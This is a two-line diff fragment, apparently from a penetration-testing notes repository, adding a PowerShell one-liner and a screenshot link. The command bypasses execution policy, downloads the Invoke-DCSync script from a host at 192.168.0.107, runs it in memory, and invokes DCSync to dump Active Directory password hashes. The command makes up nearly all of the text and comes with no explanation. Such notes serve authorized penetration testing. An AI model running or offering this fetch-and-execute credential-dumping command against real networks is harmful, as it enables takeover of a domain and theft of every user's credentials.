@@ -1,0 +1,2 @@
+	>powershell -nop -ep bypass "IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.107/ps/Invoke-DCSync.ps1');invoke-dcsync
+![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/313.png)
